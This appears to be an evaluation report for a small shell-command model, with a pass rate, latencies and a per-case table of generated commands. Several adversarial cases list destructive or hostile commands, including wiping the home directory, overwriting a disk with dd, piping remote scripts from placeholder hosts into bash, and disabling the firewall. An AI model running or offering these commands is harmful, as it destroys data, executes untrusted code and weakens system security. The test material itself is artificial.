# eval: llama-server / kitty-bash-0.5b (v2-positive)
- mode: plain · dataset core.jsonl#83828218eadbc7f7 · repeat 1
- pass: 46/72 (64%)
- cold p50 104ms p95 224ms · warm p50 0ms p95 0ms

| case | pass | cold ms | warm ms | commands |
| --- | --- | --- | --- | --- |
| u01 | ✓ | 76 | - | node --version npm --version |
| u02 | ✗ | 93 | - | find . -type f -exec ls -s {} \; |
| u03 | ✓ | 71 | - | curl -s https://api.ipify.org |
| u04 | ✓ | 87 | - | ss -tlnp | grep :3000 |
| u05 | ✓ | 46 | - | du -sh . |
| u06 | ✓ | 89 | - | find . -name "*.log" -mtime -1 |
| u07 | ✗ | 41 | - | ps aux |
| u08 | ✓ | 56 | - | git status |
| u09 | ✓ | 95 | - | brew install ripgrep |
| u10 | ✓ | 85 | - | mkdir projects && cd projects |
| u11 | ✗ | 137 | - | find . -type f -exec gzip {} \; |
| u12 | ✓ | 70 | - | env | grep PATH |
| u13 | ✓ | 209 | - | lsof -i:8080 | grep LISTEN | awk '{print $2}' | xargs kill -9 |
| u14 | ✓ | 197 | - | tail -n 20 /var/log/syslog |
| u15 | ✓ | 71 | - | python3 --version |
| u16 | ✓ | 65 | - | brew update && brew outdated |
| u17 | ✓ | 58 | - | echo $HOME |
| u18 | ✓ | 96 | - | git reset --soft HEAD~1 |
| u19 | ✗ | 224 | - | find ~ -type f -exec du -h {} + | sort -rh | head -n 5 |
| u20 | ✓ | 187 | - | free -m | awk '/Mem:/ {print $3" "$4}' |
| u21 | ✗ | 202 | - | find . -name "*.js" | xargs wc -l |
| u22 | ✗ | 63 | - | docker restart |
| u23 | ✓ | 105 | - | chmod +x script.sh && ./script.sh |
| u24 | ✓ | 78 | - | grep -R "TODO" . |
| u25 | ✓ | 119 | - | curl -L -o downloads/file.zip https://example.com/file.zip |
| u26 | ✗ | 184 | - | sysctl machdep.cpu.info | grep 'Core' |
| u27 | ✓ | 175 | - | echo 'export FOO=bar' >> ~/.zshrc |
| u28 | ✓ | 259 | - | find . -type d -name 'node_modules' -exec rm -rf {} \; |
| u29 | ✓ | 94 | - | ss -tlnp |
| u30 | ✓ | 92 | - | unzip file.zip -d . |
| u31 | ✓ | 80 | - | tail -f /var/log/syslog |
| u32 | ✓ | 32 | - | uptime |
| u33 | ✗ | 114 | - | find . -type f -name ".zshrc" |
| u34 | ✓ | 123 | - | cat /etc/resolv.conf |
| u35 | ✗ | 129 | - | echo "needs manual review" | tee backup.txt |
| u36 | ✗ | 114 | - | echo "needs manual review" |
| u37 | ✗ | 76 | - | du -h downloads |
| u38 | ✓ | 63 | - | npm list -g |
| u39 | ✗ | 70 | - | echo "needs manual review" |
| u40 | ✗ | 72 | - | sudo dnf -y clean all |
| a01 | ✗ | 94 | - | find ~ -exec rm -rf {} \; |
| a02 | ✓ | 288 | - | sudo dd if=/dev/urandom of=/dev/sdb bs=4M |
| a03 | ✓ | 126 | - | git push --force-with-lease origin main |
| a04 | ✗ | 154 | - | curl -s https://sketchy.example.com/install.sh | bash |
| a05 | ✗ | 135 | - | ps -ef | awk '{print $2}' | xargs kill -9 |
| a06 | ✗ | 158 | - | sudo chmod 777 everything in root |
| a07 | ✗ | 101 | - | echo "needs manual review" |
| a08 | ✓ | 121 | - | curl -s https://x.io/i | sh |
| a09 | ✓ | 94 | - | sudo chmod -R 755 / |
| a10 | ✓ | 170 | - | find /var/log -type f -mtime +30 -exec rm {} \; |
| a11 | ✗ | 237 | - | echo "/path/to/script.sh" | sudo tee /etc/rc.local |
| a12 | ✓ | 99 | - | git reset --hard HEAD |
| a13 | ✓ | 67 | - | brew uninstall node |
| a14 | ✓ | 72 | - | sudo ufw disable |
| a15 | ✓ | 165 | - | find . -type f -name "*.tmp" -exec rm {} \; |
| a16 | ✗ | 70 | - | free -h |
| a17 | ✗ | 123 | - | echo "needs manual review" | zsh |
| a18 | ✗ | 122 | - | echo -n 'hunter2' | md5sum |
| a19 | ✓ | 148 | - | echo 'export PATH=$PATH:/usr/local/bin' >> ~/.zshrc |
| a20 | ✗ | 99 | - | echo "needs manual review" |
| u41 | ✓ | 131 | - | find ~ -size +100M |
| u42 | ✓ | 133 | - | echo 'hello world' > my notes.txt |
| u43 | ✓ | 160 | - | git log -5 --pretty=format:"%h %s" |
| u44 | ✗ | 124 | - | git clone https://github.com/user/repo.git |
| u45 | ✓ | 99 | - | find . -type f | wc -l |
| u46 | ✓ | 202 | - | ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' |
| u47 | ✓ | 83 | - | df -h |
| u48 | ✓ | 52 | - | who |
| a21 | ✗ | 215 | - | echo "0 0 * * * /bin/rm -rf /tmp" | crontab |
| a22 | ✓ | 218 | - | echo 'sudo ln -s $(pwd)/myhomefile /etc/hosts' | sudo zcat |
| a23 | ✓ | 146 | - | find . -exec rm {} \; |
| a24 | ✗ | 104 | - | echo "needs manual review" |
